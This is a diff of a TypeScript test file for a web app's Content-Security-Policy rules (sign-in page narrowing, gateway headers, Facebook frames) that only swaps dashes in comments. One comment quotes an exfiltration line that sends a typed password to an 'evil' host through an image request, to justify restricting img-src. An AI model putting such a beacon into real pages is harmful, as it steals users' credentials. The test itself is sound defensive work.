@@ -84,8 +84,8 @@ describe('★★ a page where somebody types a password gets a narrower policy',
      * `new Image().src = 'https://evil/?p=' + password` carries the value off the
      * page over a channel `connect-src` does not govern. The general policy
      * allows `https:` because a merchant's product photos come from wherever
-     * their shop hosts them; **the sign-in screen renders none of that** — its
-     * only image is an inline SVG — so the wildcard buys nothing there.
+     * their shop hosts them; **the sign-in screen renders none of that** - its
+     * only image is an inline SVG - so the wildcard buys nothing there.
      */
     expect(directive(policy(true), 'img-src')).toEqual(["'self'", 'data:']);
     expect(directive(policy(false), 'img-src')).toContain('https:');
@@ -110,7 +110,7 @@ describe('★★ a page where somebody types a password gets a narrower policy',
     /*
      * The narrowing must not break the thing it protects. The flow executor is
      * same-origin through the gateway's `/v2/auth-api/` proxy, so `'self'`
-     * covers it — which is another reason that proxy is better than CORS.
+     * covers it - which is another reason that proxy is better than CORS.
      */
     expect(directive(policy(true), 'connect-src')).toContain("'self'");
   });
@@ -149,7 +149,7 @@ describe('★★ the policy stands on its own, because it is not the only one', 
    * A RESPONSE AT `/v2/en/sign-in` CARRIES TWO CSP HEADERS
    * ════════════════════════════════════════════════════════════════════════════
    * Ours, and a wider one from the gateway. The browser enforces both and the
-   * effective policy is the intersection, so our narrowing holds — but the
+   * effective policy is the intersection, so our narrowing holds - but the
    * gateway defines its policy in **nine** places with different values per
    * block, and nginx's `add_header` inheritance is all-or-nothing: a block that
    * defines any header drops every inherited one.
@@ -208,14 +208,14 @@ describe('★★ the policy stands on its own, because it is not the only one', 
   });
 });
 
-describe('★★ 13c — Meta’s frames on the channels pages, and nowhere else', () => {
+describe('★★ 13c - Meta’s frames on the channels pages, and nowhere else', () => {
   const frames = (options: { metaSignupSurface?: boolean; credentialSurface?: boolean }) =>
     buildContentSecurityPolicy({ nonce: 'N', isDevelopment: false, ...options })
       .split(';')
       .map((d) => d.trim())
       .find((d) => d.startsWith('frame-src'));
 
-  it('the channels surface frames www/web.facebook.com — not a wildcard', () => {
+  it('the channels surface frames www/web.facebook.com - not a wildcard', () => {
     expect(frames({ metaSignupSurface: true })).toBe(
       "frame-src 'self' https://www.facebook.com https://web.facebook.com",
     );
